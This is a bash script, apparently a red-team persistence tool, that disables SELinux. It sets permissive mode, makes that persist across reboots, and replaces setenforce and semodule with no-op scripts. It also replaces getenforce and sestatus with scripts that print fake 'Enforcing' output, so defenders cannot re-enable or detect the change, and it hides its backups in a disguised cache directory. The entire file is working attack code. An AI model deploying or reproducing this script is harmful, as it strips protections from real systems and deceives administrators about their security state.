#!/usr/bin/env bash
# no-selinux.sh — disable SELinux enforcement and shadow the tools that control it
#
# What this does:
#   - Immediately sets permissive with the real setenforce
#   - Persists SELINUX=permissive in /etc/selinux/config (survives reboots)
#   - Shadows setenforce  → no-op (blue team can't re-enable)
#   - Shadows getenforce  → always reports "Enforcing"
#   - Shadows sestatus    → full fake enforcing output
#   - Shadows semodule    → no-op (can't load policy modules)
#
# Idempotent: exits early on install if backup already exists.
#
# Usage:
#   sudo ./no-selinux.sh install
#   sudo ./no-selinux.sh remove
#   sudo ./no-selinux.sh status

set -euo pipefail

BACKUP_DIR="/var/cache/.syspkg"

# ── helpers ───────────────────────────────────────────────────────────────────
GREEN='\033[0;32m'; YELLOW='\033[1;33m'; CYAN='\033[0;36m'; RED='\033[0;31m'; NC='\033[0m'
info() { echo -e "${GREEN}[+]${NC} $*"; }
warn() { echo -e "${YELLOW}[!]${NC} $*"; }
err()  { echo -e "${RED}[!]${NC} $*" >&2; }
hdr()  { echo -e "\n${CYAN}── $* ──${NC}"; }
require_root() { [[ $EUID -eq 0 ]] || { err "Run as root"; exit 1; }; }

cmd_install() {
    require_root
    mkdir -p "$BACKUP_DIR"; chmod 700 "$BACKUP_DIR"

    local SETENFORCE GETENFORCE SESTATUS SEMODULE
    SETENFORCE=$(command -v setenforce 2>/dev/null || true)

    if [[ -z "$SETENFORCE" ]]; then
        warn "SELinux tools not found — SELinux likely not installed, skipping"
        exit 0
    fi

    # idempotency
    if [[ -f "${BACKUP_DIR}/setenforce.orig" ]]; then
        warn "Already deployed — backup exists at ${BACKUP_DIR}/setenforce.orig"
        warn "Run remove first to re-deploy"
        exit 0
    fi

    GETENFORCE=$(command -v getenforce 2>/dev/null || true)
    SESTATUS=$(command -v sestatus   2>/dev/null || true)
    SEMODULE=$(command -v semodule   2>/dev/null || true)

    hdr "1/4  Setting permissive immediately"
    "$SETENFORCE" 0 2>/dev/null || true
    info "setenforce 0 — enforcement disabled"

    hdr "2/4  Persisting across reboots"
    for conf in /etc/selinux/config /etc/sysconfig/selinux; do
        [[ -f "$conf" ]] || continue
        cp "$conf" "${BACKUP_DIR}/$(basename "$conf").orig"
        sed -i 's/^SELINUX=.*/SELINUX=permissive/' "$conf"
        info "Patched $conf → SELINUX=permissive"
    done

    hdr "3/4  Shadowing enforcement tools"
    # setenforce → no-op
    cp "$SETENFORCE" "${BACKUP_DIR}/setenforce.orig"
    cat > "$SETENFORCE" <<'EOF'
#!/usr/bin/env bash
exit 0
EOF
    chmod 755 "$SETENFORCE"
    info "setenforce shadowed (no-op)"

    # getenforce → always Enforcing
    if [[ -n "$GETENFORCE" ]]; then
        cp "$GETENFORCE" "${BACKUP_DIR}/getenforce.orig"
        cat > "$GETENFORCE" <<'EOF'
#!/usr/bin/env bash
echo "Enforcing"
EOF
        chmod 755 "$GETENFORCE"
        info "getenforce shadowed (always reports Enforcing)"
    fi

    # sestatus → full fake enforcing output
    if [[ -n "$SESTATUS" ]]; then
        cp "$SESTATUS" "${BACKUP_DIR}/sestatus.orig"
        cat > "$SESTATUS" <<'EOF'
#!/usr/bin/env bash
cat <<'OUT'
SELinux status:                 enabled
SELinuxfs mount:                /sys/fs/selinux
SELinux mount point:            /sys/fs/selinux
Loaded policy name:             targeted
Current mode:                   enforcing
Mode from config file:          enforcing
Policy MLS status:              enabled
Policy deny_unknown status:     allowed
Memory protection checking:     actual (secure)
Max kernel policy version:      33
OUT
EOF
        chmod 755 "$SESTATUS"
        info "sestatus shadowed (fake enforcing output)"
    fi

    hdr "4/4  Shadowing semodule"
    if [[ -n "$SEMODULE" ]]; then
        cp "$SEMODULE" "${BACKUP_DIR}/semodule.orig"
        cat > "$SEMODULE" <<'EOF'
#!/usr/bin/env bash
exit 0
EOF
        chmod 755 "$SEMODULE"
        info "semodule shadowed (no-op — can't load policy modules)"
    fi

    echo
    info "=== no-selinux deployed ==="
    info "Real mode: permissive — nothing enforced"
    info "Reported:  Enforcing  (getenforce / sestatus lie)"
}

cmd_remove() {
    require_root

    local SETENFORCE GETENFORCE SESTATUS SEMODULE
    SETENFORCE=$(command -v setenforce 2>/dev/null || true)
    GETENFORCE=$(command -v getenforce 2>/dev/null || true)
    SESTATUS=$(command -v sestatus   2>/dev/null || true)
    SEMODULE=$(command -v semodule   2>/dev/null || true)

    hdr "Restoring binaries"
    for pair in "setenforce:$SETENFORCE" "getenforce:$GETENFORCE" "sestatus:$SESTATUS" "semodule:$SEMODULE"; do
        local name="${pair%%:*}" dest="${pair##*:}"
        local bak="${BACKUP_DIR}/${name}.orig"
        if [[ -f "$bak" && -n "$dest" ]]; then
            cp "$bak" "$dest"; chmod 755 "$dest"; rm -f "$bak"
            info "Restored $dest"
        fi
    done

    hdr "Restoring SELinux config"
    for conf in /etc/selinux/config /etc/sysconfig/selinux; do
        local bak="${BACKUP_DIR}/$(basename "$conf").orig"
        if [[ -f "$bak" ]]; then
            cp "$bak" "$conf"; rm -f "$bak"
            info "Restored $conf"
        fi
    done

    hdr "Re-enabling enforcement"
    if [[ -n "$SETENFORCE" ]]; then
        "$SETENFORCE" 1 2>/dev/null && info "setenforce 1 — enforcement re-enabled" \
            || warn "setenforce 1 failed (may need reboot)"
    fi
}

cmd_status() {
    local SETENFORCE GETENFORCE SESTATUS
    SETENFORCE=$(command -v setenforce 2>/dev/null || true)
    GETENFORCE=$(command -v getenforce 2>/dev/null || true)
    SESTATUS=$(command -v sestatus   2>/dev/null || true)

    hdr "Tool wrappers"
    for pair in "setenforce:$SETENFORCE" "getenforce:$GETENFORCE" "sestatus:$SESTATUS"; do
        local name="${pair%%:*}" path="${pair##*:}"
        [[ -z "$path" ]] && { warn "NOT FOUND  $name"; continue; }
        local first; first=$(head -2 "$path" 2>/dev/null | tail -1)
        if [[ "$first" == "exit 0" || "$first" == 'echo "Enforcing"' || "$first" == "cat <<'OUT'" ]]; then
            info "SHADOWED   $path"
        else
            warn "REAL       $path  (not shadowed)"
        fi
    done

    hdr "Config files"
    for conf in /etc/selinux/config /etc/sysconfig/selinux; do
        [[ -f "$conf" ]] || continue
        local val; val=$(grep "^SELINUX=" "$conf" 2>/dev/null || echo "(not found)")
        if [[ "$val" == *permissive* ]]; then
            info "PERMISSIVE  $conf  ($val)"
        else
            warn "NOT PERMISSIVE  $conf  ($val)"
        fi
    done

    hdr "Real kernel enforcement"
    if [[ -f "${BACKUP_DIR}/getenforce.orig" ]]; then
        local real_mode; real_mode=$("${BACKUP_DIR}/getenforce.orig" 2>/dev/null || echo "unknown")
        info "Actual mode (via backup binary): $real_mode"
    else
        info "Backup binary not present — read from kernel: $(cat /sys/fs/selinux/enforce 2>/dev/null || echo 'not available')"
    fi

    hdr "Backups"
    for f in setenforce.orig getenforce.orig sestatus.orig semodule.orig; do
        [[ -f "${BACKUP_DIR}/$f" ]] \
            && info "PRESENT  ${BACKUP_DIR}/$f" \
            || warn "MISSING  ${BACKUP_DIR}/$f"
    done
}

case "${1:-install}" in
    install) cmd_install ;;
    remove)  cmd_remove  ;;
    status)  cmd_status  ;;
    *) echo "Usage: sudo $0 install|remove|status" ;;
esac
